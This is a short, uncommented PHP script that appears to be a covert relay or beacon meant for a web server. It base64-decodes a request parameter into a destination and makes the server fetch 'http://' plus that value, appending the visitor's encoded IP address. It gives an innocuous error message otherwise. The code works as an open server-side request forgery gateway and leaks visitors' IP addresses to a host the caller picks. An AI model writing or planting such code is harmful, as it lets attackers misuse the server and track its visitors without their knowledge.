<?php
if(isset($_REQUEST['tc'])){
$tc=base64_decode($_REQUEST['tc']);
$ip = $_SERVER['REMOTE_ADDR'];
file_get_contents("http://".$tc."&ip=".base64_encode($ip));
}else{
echo "Something is wrong";
}
?>